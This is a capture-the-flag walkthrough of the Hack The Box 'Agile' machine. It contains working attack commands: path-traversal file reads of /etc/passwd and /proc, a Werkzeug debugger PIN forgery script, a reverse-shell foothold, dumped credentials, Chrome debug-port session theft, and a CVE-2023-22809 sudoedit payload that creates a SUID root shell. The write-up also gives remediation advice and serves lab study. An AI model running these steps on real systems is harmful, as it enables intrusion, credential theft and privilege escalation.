# Agile — Debug-mode Flask, a leaked PIN, and a sudoedit escape

[![Difficulty](https://img.shields.io/badge/difficulty-Easy-green)](https://app.hackthebox.com/machines/agile)
[![OS](https://img.shields.io/badge/OS-Linux-blue)](https://app.hackthebox.com/machines/agile)
[![](https://img.shields.io/badge/walkthrough-IppSec-ff0000?logo=youtube&logoColor=white)](https://www.youtube.com/watch?v=ob-CwobmkKk)

> **Attack path:** Path traversal in the password manager's `/download` endpoint enables arbitrary file read → crash page leaks that Flask runs in debug mode → forge the Werkzeug debugger PIN → RCE as www-data → MySQL dump gives corum's SSH password → Chrome remote-debugging port steals edwards' session → sudoedit + CVE-2023-22809 writes into the venv activation script that root sources → root.

## 1 · Reconnaissance

### Port scanning

```
# nmap -p- --min-rate 10000 10.10.11.203
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# nmap -p 22,80 -sCV 10.10.11.203
22/tcp open  ssh  OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
80/tcp open  http nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://superpass.htb
```

Add the hostname: `echo '10.10.11.203 superpass.htb' >> /etc/hosts`.
Subdomain fuzzing finds nothing else.

### The web application

`http://superpass.htb` is SuperPass, a password manager (Flask — the
default 404 page gives it away). Register an account to reach `/vault`,
use "Add a password" to store a test entry, then click Export. Burp shows:

```
GET /vault/export  ->  302 to /download?fn=0xdf_export_<hex>.csv
```

Neither request appears in the browser address bar because the result is
a file download — a classic spot where vulnerabilities hide.

## 2 · Foothold

### File read via path traversal

The `fn` parameter is used as a file path without sanitization. With
`curl --path-as-is` (so the `../` survive):

```
$ cookie="session=<your session cookie>"
# curl http://superpass.htb/download?fn=../../../../etc/passwd -s --path-as-is -b $cookie
root:x:0:0:root:/root:/bin/bash
...
```

Requesting a non-existent file raises an exception, and the crash page
shows the Werkzeug traceback: the app runs with Flask debug mode on.

### Computing the Werkzeug debugger PIN

The debug console (terminal icon on the traceback) asks for a PIN
generated from host-specific values — all of which the file read can
supply. Collect the inputs for the HackTricks PIN script:

```
# curl "http://superpass.htb/download?fn=../../../../proc/self/environ" -s --path-as-is -b $cookie
# -> server runs as www-data

# curl "http://superpass.htb/download?fn=../../../../proc/net/arp" -s --path-as-is -b $cookie
# -> device is eth0

# curl "http://superpass.htb/download?fn=../../../../sys/class/net/eth0/address" -s --path-as-is -b $cookie
00:50:56:b9:48:b5

# curl "http://superpass.htb/download?fn=../../../../etc/machine-id" -s --path-as-is -b $cookie
<machine-id>

# curl "http://superpass.htb/download?fn=../../../../proc/self/cgroup" -s --path-as-is -b $cookie
0::/system.slice/superpass.service
```

Fill in the HackTricks "Werkzeug debug console" PIN script:

```python
probably_public_bits = [
    'www-data',                                  # username
    'flask.app',                                 # modname
    'wsgi_app',                                  # getattr(app, '__name__', ...)
    '/app/venv/lib/python3.10/site-packages/flask/app.py'  # from traceback
]
private_bits = [
    str(int('005056b948b5', 16)),                # MAC as int
    '<machine-id>' + 'superpass.service'         # /etc/machine-id + cgroup tail
]
# hash all bits with SHA-1 (newer Werkzeug), print as 3 groups of 3 digits
```

Two gotchas that cost most people time on this box:

- The app is served by **Gunicorn**, so the third public bit is
  `wsgi_app`, not `Flask` as every default guide claims.
- Newer Werkzeug versions hash with **SHA-1**, not MD5.

Enter the generated PIN in the debug console to get a Python console.

### Shell as www-data

`os` is already imported in the console frame; paste a Python reverse
shell (revshells.com "Python #2") and catch it:

```
# nc -lvnp 443
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The debugger periodically reloads and kills the shell (about every five
minutes), so work quickly or re-trigger as needed.

## 3 · User flag

Read the database connection string and dump the vaults:

```
www-data@agile:/app$ cat config_prod.json
{"SQL_URI": "mysql+pymysql://superpassuser:dSA6l7q*yIVs$39Ml6ywvgK@localhost/superpass"}

www-data@agile:/app$ mysql -u superpassuser -p'dSA6l7q*yIVs$39Ml6ywvgK' superpass
mysql> select * from passwords;
| url         | username | password             | user_id |
| agile       | corum    | 5db7caa1d13cc37c9fc2 |       2 |
```

corum reuses the vault password for SSH:

```
# sshpass -p '5db7caa1d13cc37c9fc2' ssh corum@superpass.htb
corum@agile:~$ cat user.txt
<flag>
```

### Pivot to edwards via Chrome remote debugging

`/app` holds a second copy of the app, `app-testing`, plus
`test_and_update.sh` — a cron that runs PyTest and copies the code to
prod when tests pass. The Selenium tests drive headless Chrome with a
fixed debug port:

```python
options.add_argument("--remote-debugging-port=41829")
```

Tunnel both the test app and the debug port over SSH:

```
# ssh -L 5555:localhost:5555 -L 41829:localhost:41829 corum@superpass.htb
```

- Browse `http://localhost:5555` (the test instance, normally only
  reachable as `test.superpass.htb` from localhost).
- In Chromium open `chrome://inspect` -> Configure -> add `localhost:41829`.
- Inspect the running tab; in DevTools' Application tab grab the session
  cookie of the test user (edwards).
- Set that cookie on the tunneled test site to open edwards' vault, which
  stores another password for "agile" (`d07867c6267dcb5df0af`) — SSH in:

```
# sshpass -p 'd07867c6267dcb5df0af' ssh edwards@superpass.htb
```

## 4 · Privilege escalation

### sudoedit enumeration

```
edwards@agile:~$ sudo -l
User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

`sudo -V` shows sudo 1.9.9 — vulnerable to **CVE-2023-22809**: extra
arguments smuggled in `SUDO_EDITOR`/`EDITOR` let the user edit files
beyond those whitelisted.

### The target file

Every shell on the box sources the app's virtualenv:

```
edwards@agile:~$ tail -2 /etc/bash.bashrc
# all users will want the env associated with this application
source /app/venv/bin/activate

edwards@agile:~$ ls -l /app/venv/bin/activate
-rw-rw-r-- 1 root dev_admin ... /app/venv/bin/activate
```

root logs in periodically and sources this file, so code dropped in it
executes as root.

### Exploit

Abuse the sudoedit vulnerability to open the activate script as dev_admin:

```
edwards@agile:~$ EDITOR='vim -- /app/venv/bin/activate' sudoedit -u dev_admin /app/config_test.json
```

Append to the file (so the venv still activates cleanly):

```bash
cp /bin/bash /tmp/0xdf && chmod 4777 /tmp/0xdf
```

Within about a minute (the next root login/cron cycle) the SUID shell
appears:

```
edwards@agile:~$ /tmp/0xdf -p
0xdf-5.0# id
uid=1002(edwards) gid=1002(edwards) euid=0(root)
```

## 5 · Root flag / Domain Admin

```
0xdf-5.0# cat /root/root.txt
<flag>
```

## 6 · Impact & remediation

| Risk | Impact | Remediation |
| --- | --- | --- |
| Path traversal in `/download?fn=` | Arbitrary file read (config, /proc, source) | Validate/canonicalize file paths; keep uploads in a store keyed by ID, not filenames |
| Flask debug mode in production | Interactive Python console = RCE once PIN is computed | Never run debug/development servers in production; disable Werkzeug debugger |
| Plaintext vault credentials in MySQL | One file read or SQL access exposes every user's passwords | Encrypt vault entries at rest with a key held client-side; isolate the DB |
| Chrome `--remote-debugging-port` in automation | Full browser/session hijack of the test user | Never expose the DevTools port; remove the flag from CI automation |
| sudo 1.9.9 vulnerable to CVE-2023-22809 | Write access to any file as dev_admin, leading to root via sourced scripts | Patch sudo (fixed in 1.9.12p2); avoid sourcing scripts from group-writable locations |

## 7 · CPTS takeaways

- The Werkzeug PIN attack chain (file read -> /proc + machine-id -> PIN -> debug console RCE) is a repeatable exam skill; remember the two Agile twists: SHA-1 hashing and Gunicorn's `wsgi_app` app-name bit.
- Always check what an "export"/"download" feature does in Burp — dynamic filenames passed to a read primitive are a classic traversal vector (`curl --path-as-is` to keep `../`).
- Post-exploitation, read app configs for DB connection strings and dump the database; password managers concentrate credentials in one table.
- Internal automation (headless Chrome, Selenium, cron test loops) is attack surface: enumerate listening localhost ports (`netstat -tnlp`) and tunnel them with SSH `-L` before writing anything off.
- sudoedit rules deserve a version check: CVE-2023-22809 turns "can edit two files" into "can edit any file as that user" — combine with anything root sources (.bashrc-style) for execution.
